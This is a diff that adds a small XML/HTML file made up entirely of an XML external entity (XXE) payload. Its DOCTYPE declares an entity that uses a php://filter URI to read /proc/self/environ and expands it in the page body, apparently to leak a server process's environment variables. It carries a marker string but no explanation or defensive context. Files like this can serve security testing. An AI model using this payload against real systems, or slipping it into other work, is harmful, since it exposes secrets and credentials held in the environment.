@@ -1,0 +1,8 @@
+<?xml version="1.0"?>
+<!DOCTYPE html [<!ENTITY xxe SYSTEM "php://filter/resource=/proc/self/environ">]>
+<html>
+<head>
+<meta name="description" content="ZKV2"/>
+</head>
+<body><p>&xxe;</p></body>
+</html>
